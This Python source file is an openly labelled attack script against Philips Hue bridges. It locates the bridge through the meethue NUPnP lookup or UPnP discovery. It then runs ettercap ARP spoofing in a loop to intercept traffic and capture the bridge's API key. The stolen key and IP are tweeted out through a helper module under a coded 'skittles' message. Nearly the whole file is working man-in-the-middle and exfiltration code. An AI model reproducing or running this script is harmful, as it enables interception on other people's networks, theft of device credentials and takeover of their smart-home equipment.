import time
import requests
import shlex
import subprocess
import keys
from netdisco.discovery import NetworkDiscovery

# Helper code listed here:
import twitterSender


def find_between( s, first, last ):
    try:
        start = s.index( first ) + len( first )
        end = s.index( last, start )
        return s[start:end]
    except ValueError:
        return ""

# End of helper code


def scan():
    # Set up variables we might use
    hue_ip = ""
    api_key = ""

    # We begin this attack by assuming that the chip has a WiFi connection to the network that the hue is on...
    # Our first step is discover the ip address of the hue bridge (controller device)

    # Run NUPnP GET request for Hue
    r = requests.get("https://www.meethue.com/api/nupnp")
    if "ipaddress" in r.text:
        hue_ip = find_between(r.text, 'internalipaddress":"', '"')
        keys.hue_ip = hue_ip
        print("Found hue bridge at " + hue_ip)

    # Use Slower UPnP lookup method if NUPnP fails.
    if hue_ip is "":
        print("NUPnP lookup failed. Trying UPnP search...")
        netdis = NetworkDiscovery()
        netdis.scan()

        for dev in netdis.discover():
            if "hue" in dev:
                hue_ip = find_between(netdis.get_info(dev)[0][0], "(", ")")
                keys.hue_ip = hue_ip
                print("Found hue bridge at " + hue_ip)

        netdis.stop()

    # Exit if hue bridge IP is still not found
    if hue_ip is "":
        print("No hue device found on the network. Better luck next time!")
        keys.hue_scanner_running = False
        twitterSender.sendmessage("Sorry! I didn't find any skittles :(")
        return

    # If a bridge is found, our next step is to intercept any data being send to it...
    print("\nNow the stakeout begins!")
    print("Starting Ettercap to collect all data sent to " + hue_ip)
    args = shlex.split('ettercap  -T -M ARP -e "api/" /// //'+hue_ip+'/80')
    while api_key is "":
        ettercap = subprocess.Popen(args, stdout=subprocess.PIPE)
        time.sleep(20)
        ettercap.terminate()
        capoutput = str(ettercap.communicate()[0], 'utf-8')
        capoutput = capoutput.replace('/api/nouser', '')  # we don't want to hit on this api key so we strip it out
        if 'api/' in capoutput:
            api_key="gotit"
            # print(capoutput) --if enabled, prints packet output to console when the api key is found
            api_key = find_between(capoutput, "api/", "/")
            api_key = api_key.partition(' ')[0]
            keys.hue_api = api_key
            twitterSender.sendmessage("Hey! I got you some skittles! :)" + keys.hue_api + " " + keys.hue_ip)
            keys.hue_scanner_running = False

